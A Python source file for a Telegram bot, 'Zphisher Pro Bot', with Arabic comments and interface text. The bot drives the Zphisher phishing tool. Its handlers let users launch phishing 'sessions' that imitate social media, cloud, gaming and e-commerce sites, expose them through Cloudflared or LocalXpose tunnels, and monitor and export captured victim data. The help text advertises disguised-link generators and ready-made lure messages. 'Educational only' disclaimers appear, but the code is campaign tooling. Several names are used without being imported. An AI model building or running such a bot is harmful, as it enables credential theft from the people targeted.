"""
🤖 الملف الرئيسي لبوت Zphisher Telegram المتقدم
يحتوي على جميع المعالجات والوظائف الأساسية للبوت
"""

import asyncio
import logging
import sys
from pathlib import Path

from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart, Command
from aiogram.types import BotCommand
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiohttp import web

# إضافة مسار المشروع
sys.path.append(str(Path(__file__).parent))

from config import settings
from database import create_tables, close_database, health_checker
from utils.security import auth_manager, require_auth, rate_limit
from keyboards.main_menu import MainMenuKeyboard
from keyboards.site_selection import SiteSelectionKeyboard
from utils.zphisher_control import session_manager

# إعداد السجلات
logging.basicConfig(
    level=getattr(logging, settings.LOG_LEVEL),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(settings.LOG_FILE),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# إنشاء مثيل البوت والموزع
bot = Bot(token=settings.BOT_TOKEN)
dp = Dispatcher()

@dp.message(CommandStart())
@rate_limit
@require_auth
async def start_handler(message: types.Message, user):
    """معالج أمر البداية"""
    
    welcome_text = f"""
🎯 **مرحباً بك في Zphisher Pro Bot**

👤 **معلوماتك:**
• الاسم: {user.first_name}
• الدور: {user.role}
• تاريخ الانضمام: {user.join_date.strftime('%Y-%m-%d')}

🚀 **ما يمكنك فعله:**
• إنشاء جلسات تصيد متقدمة
• مراقبة البيانات المُلتقطة
• إدارة الجلسات النشطة
• الوصول للأدوات المتقدمة

⚡ **بدء سريع:**
استخدم الأزرار أدناه للوصول السريع للوظائف المختلفة

⚠️ **تذكير مهم:**
هذه الأداة للأغراض التعليمية فقط. استخدمها بمسؤولية وفقاً للقوانين المحلية.
"""
    
    await message.answer(
        welcome_text,
        reply_markup=MainMenuKeyboard.get_main_menu(user),
        parse_mode="Markdown"
    )

@dp.message(Command("help"))
@rate_limit
@require_auth
async def help_handler(message: types.Message, user):
    """معالج أمر المساعدة"""
    
    help_text = """
📚 **دليل استخدام Zphisher Pro Bot**

🎯 **الأوامر الأساسية:**
• `/start` - بدء البوت والقائمة الرئيسية
• `/help` - عرض هذه المساعدة
• `/status` - حالة النظام والجلسات
• `/sessions` - جلساتك النشطة
• `/stats` - إحصائياتك الشخصية

🌐 **إنشاء جلسة جديدة:**
1. اضغط على "🌐 جلسة جديدة"
2. اختر نوع الموقع من الفئات
3. حدد نوع النفق (محلي/Cloudflared/LocalXpose)
4. انتظر إعداد الجلسة وابدأ الحملة

📊 **مراقبة البيانات:**
• استخدم "🎯 البيانات المُلتقطة" لمشاهدة النتائج
• اعرض الإحصائيات المفصلة من "📈 الإحصائيات"
• راقب الجلسات النشطة من "📱 جلساتي النشطة"

⚡ **جلسة سريعة:**
استخدم "⚡ جلسة سريعة" لبدء حملة بإعدادات افتراضية محسنة

🔧 **أدوات إضافية:**
• مولد الروابط المقنعة
• قوالب الرسائل الجاهزة  
• تصدير البيانات بصيغ مختلفة
• تحليل الأجهزة والمواقع الجغرافية

❓ **للدعم:**
استخدم "📚 المساعدة" من القائمة الرئيسية للمزيد من التفاصيل
"""
    
    await message.answer(
        help_text,
        reply_markup=MainMenuKeyboard.get_back_button(),
        parse_mode="Markdown"
    )

@dp.message(Command("status"))
@rate_limit
@require_auth  
async def status_handler(message: types.Message, user):
    """معالج أمر حالة النظام"""
    
    try:
        # الحصول على إحصائيات المستخدم
        user_stats = await db_manager.get_user_statistics(user.user_id)
        
        # الحصول على الجلسات النشطة
        active_sessions = await session_manager.get_user_active_sessions(user.user_id)
        
        status_text = f"""
📊 **حالة حسابك**

👤 **معلومات المستخدم:**
• الاسم: {user.first_name}
• الدور: {user.role}
• آخر نشاط: {user.last_seen.strftime('%Y-%m-%d %H:%M')}

📈 **الإحصائيات:**
• إجمالي الجلسات: {user_stats['total_sessions']}
• الجلسات النشطة: {user_stats['active_sessions']}
• البيانات المُلتقطة: {user_stats['total_captures']}

🔥 **الجلسات النشطة الحالية:** {len(active_sessions)}
"""
        
        if active_sessions:
            status_text += "\n🌐 **تفاصيل الجلسات النشطة:**\n"
            for i, session in enumerate(active_sessions[:3], 1):
                site_indicator = StatusKeyboard.get_site_indicator(session['site_type'])
                status_indicator = StatusKeyboard.get_status_indicator(session['status'])
                tunnel_indicator = StatusKeyboard.get_tunnel_indicator(session['tunnel_type'])
                
                status_text += f"{i}. {site_indicator} {session['site_type']} - {status_indicator} ({tunnel_indicator})\n"
            
            if len(active_sessions) > 3:
                status_text += f"   ... و {len(active_sessions) - 3} جلسة أخرى\n"
        
        await message.answer(
            status_text,
            reply_markup=MainMenuKeyboard.get_main_menu(user),
            parse_mode="Markdown"
        )
        
    except Exception as e:
        logger.error(f"خطأ في معالج الحالة: {e}")
        await message.answer(
            "❌ حدث خطأ في الحصول على معلومات الحالة",
            reply_markup=MainMenuKeyboard.get_error_keyboard("status")
        )

@dp.callback_query()
@rate_limit
@require_auth
async def callback_handler(callback: types.CallbackQuery, user):
    """معالج جميع أزرار التفاعل"""
    
    try:
        data = callback.data
        logger.info(f"معالجة callback من المستخدم {user.user_id}: {data}")
        
        # القائمة الرئيسية
        if data == "main_menu":
            await callback.message.edit_text(
                "🏠 **القائمة الرئيسية**\n\nاختر الوظيفة التي تريد استخدامها:",
                reply_markup=MainMenuKeyboard.get_main_menu(user),
                parse_mode="Markdown"
            )
        
        # لوحة التحكم
        elif data == "dashboard":
            dashboard_stats = await db_manager.get_dashboard_stats()
            
            dashboard_text = f"""
📊 **لوحة التحكم**

🌐 **إحصائيات عامة:**
• إجمالي المستخدمين: {dashboard_stats['total_users']}
• الجلسات النشطة: {dashboard_stats['active_sessions']}
• البيانات المُلتقطة اليوم: {dashboard_stats['today_captures']}
• الجلسات هذا الأسبوع: {dashboard_stats['week_sessions']}

⚡ **النشاط الأخير:**
"""
            
            for activity in dashboard_stats['recent_activity']:
                dashboard_text += f"• {activity['event_type']}: {activity['event_description']}\n"
            
            await callback.message.edit_text(
                dashboard_text,
                reply_markup=MainMenuKeyboard.get_dashboard_menu(),
                parse_mode="Markdown"
            )
        
        # جلسة سريعة
        elif data == "quick_session":
            await callback.message.edit_text(
                "⚡ **جلسة سريعة**\n\nاختر الموقع الذي تريد إنشاء جلسة له بسرعة:",
                reply_markup=MainMenuKeyboard.get_quick_session_menu(),
                parse_mode="Markdown"
            )
        
        # جلسة جديدة
        elif data == "new_session":
            if not user.can_create_sessions():
                await callback.answer("❌ ليس لديك صلاحية لإنشاء جلسات", show_alert=True)
                return
                
            await callback.message.edit_text(
                "🌐 **إنشاء جلسة جديدة**\n\nاختر فئة الموقع الذي تريد استهدافه:",
                reply_markup=SiteSelectionKeyboard.get_categories_menu(),
                parse_mode="Markdown"
            )
        
        # معالجة فئات المواقع
        elif data.startswith("category_"):
            category = data.split("_")[1]
            
            category_methods = {
                'social': SiteSelectionKeyboard.get_social_media_sites,
                'professional': SiteSelectionKeyboard.get_professional_sites,
                'cloud': SiteSelectionKeyboard.get_cloud_services_sites,
                'gaming': SiteSelectionKeyboard.get_gaming_sites,
                'ecommerce': SiteSelectionKeyboard.get_ecommerce_sites,
                'other': SiteSelectionKeyboard.get_other_sites
            }
            
            if category in category_methods:
                category_names = {
                    'social': '📱 وسائل التواصل الاجتماعي',
                    'professional': '💼 الخدمات المهنية',
                    'cloud': '☁️ الخدمات السحابية',
                    'gaming': '🎮 الألعاب والترفيه',
                    'ecommerce': '💳 التجارة الإلكترونية',
                    'other': '🔧 مواقع أخرى'
                }
                
                await callback.message.edit_text(
                    f"**{category_names[category]}**\n\nاختر الموقع الذي تريد استهدافه:",
                    reply_markup=category_methods[category](),
                    parse_mode="Markdown"
                )
        
        # معالجة المواقع الشائعة
        elif data == "popular_sites":
            await callback.message.edit_text(
                "⭐ **المواقع الأكثر استخداماً**\n\nهذه هي المواقع الأكثر فعالية:",
                reply_markup=SiteSelectionKeyboard.get_popular_sites(),
                parse_mode="Markdown"
            )
        
        # معالجة جميع المواقع
        elif data == "all_sites":
            await callback.message.edit_text(
                "📋 **جميع المواقع المتاحة**",
                reply_markup=SiteSelectionKeyboard.get_all_sites_paginated(1),
                parse_mode="Markdown"
            )
        
        # معالجة أشكال المواقع
        elif data.startswith("site_"):
            site_type = data.split("_", 1)[1]
            await callback.message.edit_text(
                f"🎯 **اختيار نوع الصفحة**\n\nاختر نوع الصفحة لموقع {site_type}:",
                reply_markup=SiteSelectionKeyboard.get_site_variants(site_type),
                parse_mode="Markdown"
            )
        
        # معالجة اختيار الجلسة
        elif data.startswith("select_"):
            parts = data.split("_")
            if len(parts) >= 3:
                site_key = parts[1]
                tunnel_type = parts[2]
                
                # إظهار رسالة تحميل
                await callback.message.edit_text(
                    "⏳ **جارٍ إنشاء الجلسة...**\n\nيرجى الانتظار بينما نقوم بإعداد كل شيء لك.",
                    reply_markup=MainMenuKeyboard.get_loading_keyboard()
                )
                
                # إنشاء وبدء الجلسة
                success, message_text, session = await session_manager.create_and_start_session(
                    user_id=user.user_id,
                    site_type=site_key,
                    tunnel_type=tunnel_type
                )
                
                if success and session:
                    session_text = f"""
🎉 **تم إنشاء الجلسة بنجاح!**

🌐 **تفاصيل الجلسة:**
• الموقع: {StatusKeyboard.get_site_indicator(session.site_type)} {session.site_type}
• النفق: {StatusKeyboard.get_tunnel_indicator(session.tunnel_type)}
• الحالة: {StatusKeyboard.get_status_indicator(session.status)}

🔗 **الروابط:**
• الرابط المحلي: `{session.local_url}`
• الرابط العام: `{session.public_url or 'جارٍ الإنشاء...'}`

📊 **إحصائيات:**
• الزوار: 0
• البيانات المُلتقطة: 0

⚡ **استخدم الأزرار أدناه لإدارة الجلسة**
"""
                    
                    await callback.message.edit_text(
                        session_text,
                        reply_markup=QuickActionKeyboard.get_session_actions(session.session_id, session.status),
                        parse_mode="Markdown"
                    )
                else:
                    await callback.message.edit_text(
                        f"❌ **فشل في إنشاء الجلسة**\n\n{message_text}",
                        reply_markup=MainMenuKeyboard.get_error_keyboard("new_session")
                    )
        
        # جلساتي النشطة
        elif data == "my_sessions":
            active_sessions = await session_manager.get_user_active_sessions(user.user_id)
            
            if not active_sessions:
                await callback.message.edit_text(
                    "📱 **جلساتك النشطة**\n\n❌ لا توجد جلسات نشطة حالياً\n\nاستخدم \"🌐 جلسة جديدة\" لإنشاء جلسة",
                    reply_markup=MainMenuKeyboard.get_back_button(),
                    parse_mode="Markdown"
                )
            else:
                sessions_text = f"📱 **جلساتك النشطة** ({len(active_sessions)})\n\n"
                
                buttons = []
                for i, session in enumerate(active_sessions, 1):
                    site_indicator = StatusKeyboard.get_site_indicator(session['site_type'])
                    status_indicator = StatusKeyboard.get_status_indicator(session['status'], False)
                    
                    sessions_text += f"{i}. {site_indicator} {session['site_type']} {status_indicator}\n"
                    sessions_text += f"   🔗 {session.get('public_url', 'N/A')}\n"
                    sessions_text += f"   👥 زوار: {session.get('total_captures', 0)}\n\n"
                    
                    buttons.append([types.InlineKeyboardButton(
                        text=f"{site_indicator} إدارة {session['site_type']}",
                        callback_data=f"manage_session_{session['session_id']}"
                    )])
                
                buttons.append([types.InlineKeyboardButton(
                    text="🔄 تحديث",
                    callback_data="my_sessions"
                )])
                
                buttons.append([types.InlineKeyboardButton(
                    text="◀️ القائمة الرئيسية",
                    callback_data="main_menu"
                )])
                
                await callback.message.edit_text(
                    sessions_text,
                    reply_markup=types.InlineKeyboardMarkup(inline_keyboard=buttons),
                    parse_mode="Markdown"
                )
        
        # الأدوات
        elif data == "tools":
            await callback.message.edit_text(
                "🔧 **الأدوات المتقدمة**\n\nاختر الأداة التي تريد استخدامها:",
                reply_markup=MainMenuKeyboard.get_tools_menu(user),
                parse_mode="Markdown"
            )
        
        # المساعدة
        elif data == "help":
            await callback.message.edit_text(
                "📚 **المساعدة والدعم**\n\nاختر نوع المساعدة التي تحتاجها:",
                reply_markup=MainMenuKeyboard.get_help_menu(),
                parse_mode="Markdown"
            )
        
        # الإعدادات
        elif data == "settings":
            await callback.message.edit_text(
                "⚙️ **الإعدادات**\n\nاختر الإعداد الذي تريد تعديله:",
                reply_markup=MainMenuKeyboard.get_settings_menu(user),
                parse_mode="Markdown"
            )
        
        # حول البوت
        elif data == "about":
            about_text = f"""
ℹ️ **حول Zphisher Pro Bot**

🎯 **نظرة عامة:**
بوت تيليجرام متقدم لإدارة أداة Zphisher بواجهة تفاعلية احترافية

⚡ **الميزات:**
• 35+ موقع مدعوم
• 3 أنواع أنفاق (localhost/Cloudflared/LocalXpose)
• مراقبة فورية للبيانات
• إحصائيات وتقارير مفصلة
• واجهة تفاعلية سهلة الاستخدام

🔧 **الإصدار:**
• إصدار البوت: 1.0.0
• إصدار Zphisher: {settings.ZPHISHER_VERSION if hasattr(settings, 'ZPHISHER_VERSION') else '2.3.5'}
• تاريخ التطوير: 2024

👤 **الدور الخاص بك:** {user.role}

⚠️ **تنويه مهم:**
هذه الأداة مخصصة للأغراض التعليمية فقط. المطور غير مسؤول عن سوء الاستخدام.
"""
            
            await callback.message.edit_text(
                about_text,
                reply_markup=MainMenuKeyboard.get_back_button(),
                parse_mode="Markdown"
            )
        
        # تأكيد الرد على الاستعلام
        await callback.answer()
        
    except Exception as e:
        logger.error(f"خطأ في معالج الـ callback: {e}")
        await callback.answer("❌ حدث خطأ في معالجة طلبك", show_alert=True)

async def setup_bot_commands():
    """إعداد أوامر البوت"""
    
    commands = [
        BotCommand(command="start", description="🏠 القائمة الرئيسية"),
        BotCommand(command="help", description="📚 المساعدة"),
        BotCommand(command="status", description="📊 حالة النظام"),
        BotCommand(command="sessions", description="📱 الجلسات النشطة"),
        BotCommand(command="stats", description="📈 الإحصائيات"),
    ]
    
    await bot.set_my_commands(commands)
    logger.info("✅ تم إعداد أوامر البوت")

async def on_startup():
    """إجراءات بدء التشغيل"""
    
    try:
        # إنشاء جداول قاعدة البيانات
        await create_tables()
        
        # بدء فاحص صحة قاعدة البيانات
        await health_checker.start()
        
        # إعداد أوامر البوت
        await setup_bot_commands()
        
        # إرسال رسالة للمسؤول الرئيسي
        try:
            await bot.send_message(
                settings.SUPER_ADMIN_ID,
                "🤖 **Zphisher Pro Bot بدأ التشغيل**\n\n✅ جميع الأنظمة تعمل بشكل طبيعي",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.warning(f"فشل في إرسال رسالة البداية للمسؤول: {e}")
        
        logger.info("🚀 تم بدء تشغيل البوت بنجاح")
        
    except Exception as e:
        logger.error(f"❌ خطأ في بدء التشغيل: {e}")
        raise

async def on_shutdown():
    """إجراءات إيقاف التشغيل"""
    
    try:
        # إيقاف فاحص صحة قاعدة البيانات
        await health_checker.stop()
        
        # إغلاق اتصال قاعدة البيانات
        await close_database()
        
        # إرسال رسالة للمسؤول الرئيسي
        try:
            await bot.send_message(
                settings.SUPER_ADMIN_ID,
                "🤖 **Zphisher Pro Bot تم إيقافه**\n\n⚠️ البوت متوقف حالياً",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.warning(f"فشل في إرسال رسالة الإيقاف للمسؤول: {e}")
        
        logger.info("🛑 تم إيقاف البوت بأمان")
        
    except Exception as e:
        logger.error(f"❌ خطأ في إيقاف التشغيل: {e}")

async def main():
    """الدالة الرئيسية"""
    
    try:
        # إجراءات بدء التشغيل
        await on_startup()
        
        if settings.USE_WEBHOOK:
            # تشغيل البوت باستخدام Webhook
            app = web.Application()
            
            webhook_requests_handler = SimpleRequestHandler(
                dispatcher=dp,
                bot=bot
            )
            webhook_requests_handler.register(app, path="/webhook")
            
            setup_application(app, dp, bot=bot)
            
            runner = web.AppRunner(app)
            await runner.setup()
            
            site = web.TCPSite(
                runner,
                host=settings.WEBHOOK_HOST,
                port=settings.WEBHOOK_PORT
            )
            
            await bot.set_webhook(
                url=settings.WEBHOOK_URL,
                drop_pending_updates=True
            )
            
            logger.info(f"🌐 البوت يعمل بوضع Webhook على {settings.WEBHOOK_HOST}:{settings.WEBHOOK_PORT}")
            
            await site.start()
            
            # إبقاء البوت يعمل
            try:
                await asyncio.Event().wait()
            finally:
                await runner.cleanup()
        else:
            # تشغيل البوت باستخدام Long Polling
            logger.info("🔄 البوت يعمل بوضع Long Polling")
            await dp.start_polling(bot, drop_pending_updates=True)
            
    except KeyboardInterrupt:
        logger.info("⏹️ تم إيقاف البوت يدوياً")
    except Exception as e:
        logger.error(f"❌ خطأ في تشغيل البوت: {e}")
        raise
    finally:
        await on_shutdown()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("👋 وداعاً!")
    except Exception as e:
        logger.error(f"💥 خطأ فادح: {e}")
        sys.exit(1)